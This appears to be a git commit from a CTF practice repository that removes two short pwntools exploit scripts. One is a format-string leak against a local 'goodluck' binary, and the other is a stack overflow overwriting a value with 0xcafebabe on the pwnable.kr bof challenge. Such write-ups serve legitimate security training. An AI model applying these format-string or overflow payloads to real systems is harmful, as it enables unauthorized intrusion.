b4099a2d2fc8c20b02d89fea488dd8d77929ebdc
V1NKe <v1nke@tom.com>
2020-10-28 19:14:28 +0800

    update the repo

--- PwnWiKi/GeShiHua/goodluck/exp.py
+++
@@ -1,8 +0,0 @@
-from pwn import *
-
-p = process('./goodluck')
-
-playload = '%9$s'
-p.sendline(playload)
-print p.recv()
-p.interactive()
--- Pwnablekr/bof/exp_bof.py
+++
@@ -1,5 +0,0 @@
-from pwn import *
-
-r = remote('pwnable.kr',9000)
-r.send('A'*52+p32(0xcafebabe))
-r.interactive()
